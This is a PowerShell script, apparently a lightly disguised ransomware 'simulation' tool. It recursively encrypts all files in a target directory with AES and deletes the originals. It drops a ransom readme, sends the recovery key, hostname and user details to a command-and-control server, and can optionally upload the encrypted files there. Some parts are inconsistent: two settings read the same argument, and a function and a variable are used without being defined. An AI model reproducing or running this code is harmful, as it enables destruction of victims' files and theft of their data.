# Design
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*") {
   $Host.UI.RawUI.WindowTitle = "hello" 
   $Host.UI.RawUI.BackgroundColor = "Black"
   $Host.UI.RawUI.ForegroundColor = "White" 
}

# Banner
function Show-Banner {
   Write-Host "hello" -ForegroundColor Green 
}

# Help
function Show-Help {
   Write-Host "hello" -ForegroundColor Yellow -NoNewLine
}

# Variables
$Mode = $args[0]
$Directory = $args[1]
$PSRKey = $args[3]
$C2Server = $args[3]
$C2Port = $args[5]
$Exfil = $args[6]
$C2Status = $null

# Errors
if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }

# Proxy Aware
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

# Functions
$computer = ([Environment]::MachineName).ToLower() ; $user = ([Environment]::UserName).ToLower() ; $Readme = "readme.txt"
$Time = Get-Date -Format "HH:mm - dd/MM/yy" ; $TMKey = $time.replace(":", "").replace(" ", "").replace("-", "").replace("/", "") + $computer
if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower() + "\") ; $slash = "\" } else { $domain = $null ; $slash = "/" } 
$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }

function Invoke-SayHello {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
      [Parameter(Mandatory = $true)]
      [ValidateSet("SayHello", "SayGoodBye")]
      [String]$Mode,

      [Parameter(Mandatory = $true)]
      [String]$Key,

      [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
      [String]$Text,

      [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
      [String]$Path)

   Begin {
      $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
      $aesManaged = New-Object System.Security.Cryptography.AesManaged
      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $aesManaged.BlockSize = 128
      $aesManaged.KeySize = 256 
   }

   Process {
      $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      switch ($Mode) {

         "SayHello" {
            if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }

            if ($Path) {
               $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
               if (!$File.FullName) { break }
               $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
               $outPath = $File.FullName + ".psr" 
            }

            $bzztor = $aesManaged.CreateEncryptor()
            $bzztedBytes = $bzztor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
            $bzztedBytes = $aesManaged.IV + $bzztedBytes
            $aesManaged.Dispose()

            if ($Text) { return [System.Convert]::ToBase64String($bzztedBytes) }
            if ($Path) {
               [System.IO.File]::WriteAllBytes($outPath, $bzztedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
            }
         }

         "SayGoodBye" {
            if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }

            if ($Path) {
               $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
               if (!$File.FullName) { break }
               $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
               $outPath = $File.FullName.replace(".psr", "") 
            }

            $aesManaged.IV = $cipherBytes[0..15]
            $tzzbor = $aesManaged.CreateDecryptor()
            $tzzbedBytes = $tzzbor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
            $aesManaged.Dispose()

            if ($Text) { return [System.Text.Encoding]::UTF8.GetString($tzzbedBytes).Trim([char]0) }
            if ($Path) {
               [System.IO.File]::WriteAllBytes($outPath, $tzzbedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
            }
         }
      }
   }

   End {
      $shaManaged.Dispose()
      $aesManaged.Dispose()
   }
}

function RemoveWallpaper {
   $code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.Win32;
 
namespace CurrentUser { public class Desktop {
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);
public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;
public const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;
public int[] first = {COLOR_DESKTOP};

public static void RemoveWallPaper(){
SystemParametersInfo( SetDesktopBackground, 0, "", SendWinIniChange | UpdateIniFile );
RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
regkey.SetValue(@"WallPaper", 0); regkey.Close();}

public static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};

RemoveWallPaper();
System.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);
int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };

SetSysColors(elements.Length, elements, colors);
RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Colors", true);
key.SetValue(@"Background", string.Format("{0} {1} {2}", color.R, color.G, color.B));
key.Close();}}}
 
"@
   try { Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll }
   finally { [CurrentUser.Desktop]::SetBackground(250, 25, 50) }
}



function R64Encoder { 
   if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "â€“") ; $base64 = $base64.Replace("/", "_")
   $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base 
}

function ShowInfo {
   Write-Host ; Write-Host "[>] Hostname: " -NoNewLine -ForegroundColor Yellow ; Write-Host $computer
   Write-Host "[>] Current User: " -NoNewLine -ForegroundColor Yellow ; Write-Host $domain$user
   Write-Host "[>] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time 
}

function GetStatus {
   Try {
      Invoke-WebRequest -useb "$C2Server`:$C2Port/status" -Method GET 
      Write-Host "[i] Command & Control Server is up!" -ForegroundColor Green 
   }
   Catch { Write-Host "[!] Command & Control Server is down!" -ForegroundColor Red }
}

function SendResults {
   $DESKey = Invoke-SayHello -Mode SayHello -Key $TMKey -Text $PSRKey ; $B64Key = R64Encoder -t $DESKey
   $C2Data = " [>] Key: $B64Key [>] Hostname: $computer [>] Current User: $domain$user [>] Current Time: $time"
   $giftLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "hello!" -NotMatch
   $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t $giftLogs
   Invoke-WebRequest -useb "$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
   Invoke-WebRequest -useb "$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null 
}

function SendClose {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/close" -Method GET 2>&1> $null 
}

function SendPay {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/pay" -Method GET 2>&1> $null 
}

function SendOK {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null 
}

function CreateReadme {
   $ReadmeTXT = "All your files have been bzzted by hello!`nBut don't worry, you can still recover them with the recovery key :)`n"
   if (!(Test-Path "$Directory$slash$Readme")) {
      Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT 
      Add-Content -Path "$Directory$slash$Readme" -Value "Recovery Key: $PSRKey `n" 
   }
}

function SayHello { 
   $ExcludedFiles = '*.psr', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
      Invoke-SayHello -Mode SayHello -Key $PSRKey -Path $i ; Add-Content -Path "$Directory$slash$Readme" -Value "[!] $i is now bzzted" ; Remove-Item $i 
   }
   $giftLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "hello!" -NotMatch ; if (!$giftLogs) { 
      Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been bzzted!" 
   }
}

function ExfiltrateFiles {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
   $giftLogs = Get-Content "$Directory$slash$Readme" | Select-String "No files have been bzzted!" ; if (!$giftLogs) {
      foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
         $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
         Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null 
      }
   }
   else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }
}

function SayGoodBye {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      Invoke-SayHello -Mode SayGoodBye -Key $PSRKey -Path $i ; $rfile = $i.replace(".psr", "")
      Write-Host "[+] $rfile is now tzzbed" -ForegroundColor Blue 
   } ; Remove-Item "$Directory$slash$Readme" 
}

function CheckFiles { 
   $RFiles = Get-ChildItem $Directory -recurse -filter *.psr ; if ($RFiles) { $RFiles | Remove-Item } else {
      Write-Host "[!] No bzzted files has been found!" -ForegroundColor Red 
   }
}

# Main
Show-Banner ; ShowInfo

if ($Mode -eq "-d") { 
   Write-Host ; Write-Host "[!] Recovering giftware infection on $DirectoryTarget directory.." -ForegroundColor Red
   Write-Host "[i] Applying recovery key on bzzted files.." -ForegroundColor Green
   SayGoodBye ; CheckFiles ; sleep 1 
}
 
else {
   Write-Host ; Write-Host "[!] Simulating giftware infection on $DirectoryTarget directory.." -ForegroundColor Red
   Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
   $C2Status = GetStatus ; sleep 1

   Write-Host "[+] Generating new random string key for bzztion.." -ForegroundColor Blue
   $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % { [char]$_ })

   Write-Host "[!] bzzting all files with 256 bits AES key.." -ForegroundColor Red
   CreateReadme ; SayHello ; if ($C2Status) {
      SendResults ; sleep 1

      if ($Exfil -eq "-x") {
         Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
         ExfiltrateFiles ; sleep 1 
      }
   }

   if (!$C2Status) { Write-Host "[+] Saving logs and key in readme.txt.." -ForegroundColor Blue }
   else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }
}

if ($args -like "-demo") {
   RemoveWallpaper ; PopUpGift
   if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }
}
else { SendOK }

sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
